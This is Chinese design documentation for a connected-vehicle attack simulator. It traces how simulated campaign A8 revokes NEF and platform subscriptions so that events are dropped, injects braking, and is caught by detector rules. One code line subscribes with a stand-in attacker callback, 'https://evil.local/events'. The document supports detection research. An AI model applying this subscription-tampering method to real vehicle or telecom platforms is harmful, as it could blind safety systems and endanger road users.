# A8 NEF/订阅篡改：代码走读与实现解析

> 代码基线：`feature/trace-watch`（v0.3.0 + A1–A10 TraceProfile），2026-11-03。
> 共享机制见 [A1 §2–§4](A1-感知篡改诱导通信拥塞.md)；本文只写 A8 的差异。
> 目标：解释“NEF 退订 → 平台订阅撤销 → ingest 漏事件 → 云控制动”的代码路径，并说明 stop 的不对称清理。

## 1. 一句话概括

A8 做四件事：

1. 用 NEF 签一个 `nef:subscribe` token，订阅 `denm/spat`，然后立刻退订；
2. 撤销平台当前第一个订阅；
3. 把 `platform_ingest_delay_ms` 设为 80；
4. 直接 `inject_brake(2.5, 1.0)`。

它没有改 NEF 的鉴权策略，也没有阻止平台重新订阅；它只是把已有订阅置为 REVOKED，导致后续 ingest 找不到 `active_for(msg_type)`，从而被标记 `dropped/no_subscription`。

## 2. 端到端调用链

```text
POST /api/attacks {type:"A8", amplitude, duration, start}
  → CampaignA8.start(ctx)
      ├─ ready()：等 platform 订阅 bootstrap（约 t=0.05）
      ├─ NEF 腿：issue_token → subscribe(denm,spat) → unsubscribe（无下游投递）
      ├─ 平台腿：挑一个 ACTIVE 且覆盖 denm 的订阅 → subs.shrink(scope)
      └─ truth.add()
  → CampaignA8.tick(ctx)：一次 control.inject_brake(1.5+2a, 1.0)
  → 同一时间：platform.tick() 因订阅缺失而 dropped(cause=no_subscription)
  → stop(ctx)：若平台已无 denm 订阅，重新 subscribe(cpm,denm,spat)
```

层序：

```text
scheduler → sensing → v2x → uu → core → auth → platform → control
```

A8 的 `core.nef`/`app.subscription` 在 scheduler 里直接 emit；平台 ingest 在后面的 `platform.tick()` 读取订阅状态。

## 3. 参数

```python
amp = clamp(spec.amplitude)
scope = ["denm"] if amp < 0.4 else (["denm","spat"] if amp < 0.75 else ["denm","spat","cpm"])
self.brake_decel = 1.5 + 2.0 * amp       # 1.5..3.5 m/s²
```

- 强度体现在**退订范围**：只丢 DENM → 加 SPaT → 再把 CPM 也丢掉（真实 dropped 从 ~1/s 到 ~30/s）；
- 平台退订对象是“第一个 ACTIVE 且覆盖 denm 的订阅”，不是写死的 `subs[0]`
  （旧实现第二次运行会撤到已 REVOKED 的那条，看着成功、实际没有 dropped）；
- 平台延迟已移除：它不是 A8 的语义，去掉后 A8 不再靠 `ingest_latency_spike` 被检出。

| `a` | 退订范围 | dropped（3 s） | 制动 |
|---:|---|---:|---:|
| 0.3 | denm | ≈1 | 2.1 |
| 0.5 | denm, spat | ≈10 | 2.5 |
| 0.8 | denm, spat, cpm | ≈97 | 3.1 |
| 1.0 | denm, spat, cpm | ≈106 | 3.5 |

包络：`revoked_event_types >= 2`（只退 denm 时属于包络外）。

## 4. 注入点

### 4.1 NEF token + 订阅 + 退订

```python
token = core.nef.issue_token(ctx, subject="attacker:A8",
    tenant=platform.tenant, scopes=["nef:subscribe"], ttl_s=30.0)
sub = core.nef.subscribe(ctx, token_id=token.token_id,
    event_types=["denm", "spat"], callback="https://evil.local/events")
core.nef.unsubscribe(ctx, token_id=token.token_id, sub_id=sub.sub_id)
```

- `subscribe` 会 emit `core.nef` `api_subscribe`；
- `unsubscribe` 会 emit `core.nef` `api_unsubscribe`，`result=accept`；
- 订阅状态是 `REVOKED`，但没有真实回调、没有通知；
- 这一段是**NEF API 滥用证据**：它只改 NEF 内部状态，**没有任何下游投递**，
  不影响受害车。`truth.params.nef_leg_effect` 固定记 `"none"`；
- `issue_token` 目前对任何主体开放（本环境假设 NEF 签发未鉴权），
  所以“攻击者拿到 token”不算越权，只是正常开户——见 §10.3。

### 4.2 平台订阅撤销

```python
target = 第一个 ACTIVE 且覆盖 "denm" 的订阅（没有就取第一个 ACTIVE）
revoked = platform.subs.shrink(ctx, target, scope)   # scope 由 amplitude 决定
```

`shrink()` 只把 `scope` 里的事件类型从订阅里移除，其余继续投递：

- `scope=["denm"]` → DENM 全丢，CPM/SPaT 正常；
- `["denm","spat"]` → 再加 SPaT；
- `["denm","spat","cpm"]` → 订阅变空、置 REVOKED，后续全部 `dropped`。

旧实现有两个洞，本轮修掉：①固定撤 `subs[0]`，第二次运行会撤到已 REVOKED 的订阅，
看着成功但 0 条 dropped；②固定撤整条订阅，`amplitude` 完全无效。

### 4.3 平台漏事件

`PlatformLayer.tick()`：

```python
active = self.subs.active_for(msg_type)
self.ingest.ingest(..., dropped=not bool(active),
                   cause=None if active else "no_subscription")
```

这会让 `app.ingest` 的 `result=dropped`、`cause=no_subscription`；它不代表消息在空口丢了，
而是平台没有订阅。攻击窗口内 dropped 率与退订范围成正比：a=0.8 时 3 s 约 97 条
（cpm 87 / spat 9 / denm 1），恢复订阅后归零。

### 4.4 制动

```python
control.inject_brake(ctx, self.veh_id, decel=1.5 + 2.0 * amp, duration=1.0)
```

`ttc=99`、`reason=injected`。

## 5. 下游消费

| 消费者 | 看到什么 |
|---|---|
| CoreProvider | `core:nef` 的 `unsubscribed=1`、`subscriptions` 状态 |
| Platform | `platform:subscriptions` 里目标订阅的事件类型变少/变 REVOKED；`app.ingest` 持续 dropped |
| Control | 一条 `control.command` |
| Detector | `subscription_tamper`、`nef_subscription_tamper`、**`ingest_drop_spike`**、`brake_without_hazard` |
| Trace | `core.nef`、`app.subscription`、`app.ingest`、`control.command` |

## 6. 真值

`CampaignA8.truth()`（[campaigns.py](../../isacsim/attacks/campaigns.py:718)）实测：

```json
{
  "nodes": ["nef:NEF-01", "platform:V2X-01", "tenant:city-a",
            "veh:eastbound.2", "attacker:A8"],
  "domains": ["core", "app", "v2x", "task", "control"],
  "params": {
    "revoked_event_types": ["denm", "spat", "cpm"],
    "victim": "eastbound.2",
    "token": "nef-tok-0001",
    "brake_decel": 3.1,
    "ingest_dropped": 97,
    "target_matched": false,
    "nef_leg_effect": "none"
  },
  "envelope": {"in_envelope": true, "criterion": "revoked_event_types >= 2"},
  "stages": [
    {"name": "退订平台/NEF 订阅", "t0": 2.0, "t1": 3.0},
    {"name": "平台漏事件", "t0": 3.0, "t1": 5.0}
  ],
  "causal_chain": [
    "app.subscription:shrink",
    "app.ingest:no_subscription",
    "control.command:inject"
  ]
}
```

`domains` 含 `task`，但代码没有专门的 task 事件；这是声明。
`causal_chain` 去掉了 `nef:*`：NEF 腿没有下游，不构成受害因果（见 §4.1、§10.3）。

## 7. 检测侧看到了什么

| 规则 | 触发 |
|---|---|
| `subscription_tamper` | `app.subscription.action=revoke, result=accept` |
| `ingest_drop_spike` | 1 s 内 `app.ingest` 且 `cause=no_subscription` ≥10 条 |
| `nef_subscription_tamper` | `core.nef.msg_type=api_unsubscribe, result=accept` |
| `brake_without_hazard` | ttc=99 |

seed=14、a=0.8、3 s 攻击实测：

```text
ingest_drop_spike ×3, subscription_tamper ×1,
nef_subscription_tamper ×1, brake_without_hazard ×1
```

`ingest_drop_spike` 是**行为证据**：即使不看退订事件，平台“突然成片丢订阅内消息”
本身就可疑；它也让 A8 不再依赖人造的 `ingest_latency_spike`。

## 8. 外部检测视角：数据支撑、`/trace` 位置与 `out/` 落点

> 本节假设判定在仿真之外完成：只看导出的观测流与日志，不读 `truth/`、不读 `ctx.extras`。可观测面清单与路径/落盘规则见 [A1 §9.1、§9.4](A1-感知篡改诱导通信拥塞.md)。

### 8.1 判定 A8 需要的数据支撑

A8 分两条腿：①NEF 腿——拿到 token、建一个指向外部回调的订阅再退订，
只留“API 滥用”证据，**不影响受害车**；②平台腿——把平台订阅里的事件类型按幅度摘掉，
平台随即“看不见”DENM/SPaT/CPM。判定要以后者为主，前者只作背景。

| 观测面 | 需要捕获的字段 | 在判定中的作用 | 可依赖度 |
|---|---|---|---|
| `core.nef` | `msg_type`、`token_id`、`subscription_id`、`event_types`、`callback`、`result`、`subject` | `token_issue(subject=attacker:A8)` → `api_subscribe(callback=https://evil.local/events)` → `api_unsubscribe accept` | 协议证据（关键） |
| `app.subscription` | `action`、`result`、`subscription_id`、`event_types`、`remaining` | 平台订阅被摘掉若干事件类型（`event_types` 是被摘掉的，`remaining` 是剩下的） | 协议证据（关键） |
| `app.ingest` | `result`、`cause`、`msg_type`、`source` | `result=dropped`、`cause=no_subscription` 激增，且按 `msg_type` 分布 | 物理证据（关键） |
| `v2x.denm` / `v2x.spat` | `sender_pseudo`、`msg_type`、`cause` | 空口仍有消息 → 平台侧漏事件，不是空口丢包 | 反证（关键） |
| `control.command` | `params.ttc_s`、`src` | `ttc=99`、`src=attacker:ctl-*` | 物理/协议证据 |
| `link.metrics` | `cbr`、`jam` | 不变 → 排除 A1/A2 | 反证 |

判定口径：

```text
R1 app.subscription 出现 revoke accept，且订阅的 event_types 被摘掉 ≥1 类。
R2 同一 msg_type 在 v2x.* 仍有记录，但 app.ingest 的 result=dropped/cause=no_subscription
   成片出现（a=0.8 约 30 条/s；只退 denm 时约 1 条/s）。
R3 control.command 的 ttc_s>=10。
=> R1∧R2 判“订阅篡改 + 平台漏事件”；R3 是放大器。
NEF 腿（core.nef 的 api_unsubscribe）只作背景：它没有下游投递，不构成受害后果。
```

边界：

- 没有真实 NEF HTTP 调用与回调投递，`callback` 只是记录字段；NEF 腿**没有下游**，
  `truth.params.nef_leg_effect` 固定 `"none"`；
- `stop()` 只恢复平台订阅（重新订阅 cpm/denm/spat），**不**撤销 NEF token，也不恢复 NEF 订阅；
  `out/` 末尾会多一条 `app.subscription subscribe`；
- `app.ingest.result=dropped` 是平台侧“没有活动订阅”，不是空口丢包；
- 平台延迟已移除：A8 不再伪造 `ingest_latency_spike`；
- `amplitude` 现在有效：退订范围 denm → denm+spat → denm+spat+cpm，制动 1.5–3.5 m/s²。

### 8.2 对应前端 `/trace` 的位置

| 数据 | `/trace` 位置 | 看什么 |
|---|---|---|
| NEF 退订 | **核心网** → `核心网 · Core` 卡 → 子标签「节点」的 NEF 节点；右栏 `core.nef` 事件 | NEF 指标里 `unsubscribed` 上升（本剧本不撤销 token，`revoked` 仍为 0）、红点 reasons `unsubscribed 1`；事件 `api_unsubscribe accept`（`callback` 不在事件白名单） |
| 平台订阅 | **平台** → `平台 · V2X` 卡 → 子标签「订阅」 | 目标订阅的 `event_types` 变少（或整条 REVOKED）；`callback` 列显示平台侧回调 |
| 漏事件 | 平台概览 `ingest_dropped`；右栏 `app.ingest` 事件 | `result=dropped`、`cause=no_subscription` |
| 制动 | **车辆** → `<victim> · state`；右栏 `control.command` | `decel=3.1`、`ttc=99` |
| 告警 | **总览** → `Detector · alerts`；**底栏时间轴** | `ingest_drop_spike`、`subscription_tamper`、`nef_subscription_tamper`、`brake_without_hazard` |
| 阶段 | 顶栏 **下一步** 后的检查点横幅 | S1 NEF 退订 → S2 平台订阅撤销 → S3 平台漏事件 → S4 云控 → S5 告警 |

不在 `/trace` 上的：NEF 的 `callback` 地址（不在事件字段白名单，只有 `out/core.nef.jsonl` 有）、NEF 订阅表（「订阅」表只显示平台侧）、`v2x.spat` 全量。

### 8.3 对应后端 `out/` 的位置

| 数据 | 文件 | 过滤键 / 字段 | 备注 |
|---|---|---|---|
| NEF 退订 | `core.nef.jsonl` | `.payload.msg_type=="api_unsubscribe"`、`result=="accept"` | 同文件有 `token_issue`/`api_subscribe` |
| 可疑回调 | `core.nef.jsonl` | `.payload.callback` | `https://evil.local/events` |
| 平台订阅撤销 | `app.subscription.jsonl` | `.payload.action=="revoke"`、`result=="accept"` | 末尾还有恢复订阅 |
| 平台漏事件 | `app.ingest.jsonl` | `.payload.result=="dropped"`、`.payload.cause=="no_subscription"` | 按 `msg_type` 分组 |
| 空口对照 | `v2x.denm.jsonl` / `v2x.spat.jsonl` | 同窗口仍有记录 | 证明不是空口丢 |
| 制动 | `control.command.jsonl` | `.payload.params.decel_mps2==3.1` | |
| 真值（评估侧） | `truth/events.jsonl` | `.campaign=="A8"` | `params.revoked_event_types/ingest_dropped` |
| 告警 | `alerts.jsonl` | `ingest_drop_spike` / `subscription_tamper` / `nef_subscription_tamper` | 仅 CLI/batch |

```bash
cd out/doc_a8/arterial-14-*
jq -c 'select(.payload.msg_type=="api_subscribe") | {sub:.payload.subscription_id, cb:.payload.callback, et:.payload.event_types}' core.nef.jsonl
jq -c 'select(.payload.action=="revoke") | {sub:.payload.subscription_id, et:.payload.event_types}' app.subscription.jsonl
jq -c 'select(.payload.result=="dropped") | .payload.msg_type' app.ingest.jsonl | sort | uniq -c
```

> A8 的判定关键是“平台侧看不见、空口侧还看得见”：只对比 `app.ingest` 会以为消息丢了，必须拿 `v2x.*` 做对照。

## 9. 时序

| 相对 `t0` | 事件 |
|---:|---|
| 0 | NEF 发 token/订阅/退订（无下游）；平台订阅被摘掉 `scope` 里的类型 |
| +0.1 | `app.ingest` 开始 dropped/no_subscription（范围决定速率：≈1/s ~ ≈30/s） |
| +0.1 | 制动 `control.command`（`decel=1.5+2a`） |
| +0.8 | `ingest_drop_spike` 攒够 10 条/s（仅当撤到 cpm） |
| `t1` | 平台若没有 denm 订阅，重新订阅 cpm/denm/spat |

## 10. 边界与差异

1. **NEF 腿没有下游**：`subscribe/unsubscribe` 只改 NEF 状态，没有回调、没有通知投递，
   不影响受害车；真值 `params.nef_leg_effect="none"`。
2. **NEF token 是自助签发的**：`issue_token` 对任何主体开放，所以“拿到 token”
   不算越权（本环境的已知简化，见 §10 末尾）。
3. **`stop` 只恢复平台订阅**：不撤销 NEF token，也不恢复 NEF 订阅；
   `core:nef` 里那条 `api_unsubscribe` 仍保持 REVOKED。
4. **`app.ingest.result=dropped` 是平台侧无订阅**，不是空口丢包。
5. **`amplitude` 现在有效**：退订范围 1–3 类、制动 1.5–3.5 m/s²；
   只退 denm 时 dropped ≈1/s，属于包络外。
6. **取消会走 `stop(ctx)`**（R2 已修）：实测取消后平台订阅恢复；
   旧文档里“cancel 只置 finished”的结论已过期。
7. **重复运行有效**：退订对象按 `state=ACTIVE 且覆盖 denm` 选，不再撤到已 REVOKED 的订阅
   （旧实现第二次运行 0 条 dropped）。

## 11. 复现与检查

```bash
.venv/bin/python -m isacsim run \
  --seed 14 -a A8 --duration 8 --attack-duration 3 \
  --attack-start 2 --amplitude 0.8 --out out/doc_a8
```

| 文件 | 看什么 |
|---|---|
| `core.nef.jsonl` | `api_unsubscribe`、`result=accept` |
| `app.subscription.jsonl` | `action=revoke`、`result=accept` |
| `app.ingest.jsonl` | `result=dropped`、`cause=no_subscription` |
| `control.command.jsonl` | `decel_mps2=3.1`、`ttc=99` |
| `truth/events.jsonl` | `params.revoked_event_types/ingest_dropped` |
| `alerts.jsonl` | `ingest_drop_spike`、`subscription_tamper`、`nef_subscription_tamper` |

## 12. 代码索引

| 作用 | 位置 |
|---|---|
| A8 类与 `ready/start/tick/stop/truth` | [campaigns.py](../../isacsim/attacks/campaigns.py) `class CampaignA8` |
| NEF token/订阅/退订 | [nef.py](../../isacsim/layers/core/nef.py) |
| 平台订阅撤销/部分退订 | [subscription.py](../../isacsim/layers/platform/subscription.py) `shrink/revoke` |
| 平台 ingest | [ingest.py](../../isacsim/layers/platform/ingest.py) |
| `subscription_tamper` / `nef_subscription_tamper` | [reference.py](../../isacsim/detect/reference.py) `_on_app_subscription/_on_core_nef` |
| `ingest_drop_spike` | [reference.py](../../isacsim/detect/reference.py) `_on_app_ingest` |
| A8 profile | [profiles.py](../../isacsim/trace/profiles.py) `A8_PROFILE` |
| 回归测试 | [tests/test_a78.py](../../tests/test_a78.py) |

## 13. 小结

```text
NEF token → subscribe(evil) → unsubscribe     ← 只有 API 证据，无下游
        │
平台订阅 shrink(scope)  ← scope = denm / +spat / +cpm
        │
app.ingest 无 active 订阅 → dropped/no_subscription（≈1/s ~ ≈30/s）
        │
        ├─ ingest_drop_spike（行为证据）
        └─ inject_brake(1.5+2a) → brake_without_hazard
```

A8 的核心是“让平台收不到关键事件”，而不是“让消息在空口丢失”。
检测现在有一条不依赖退订事件的行为证据：平台在 1 s 内成片丢订阅内消息
（`ingest_drop_spike`）。NEF 腿只作 API 滥用背景，不计入受害因果。
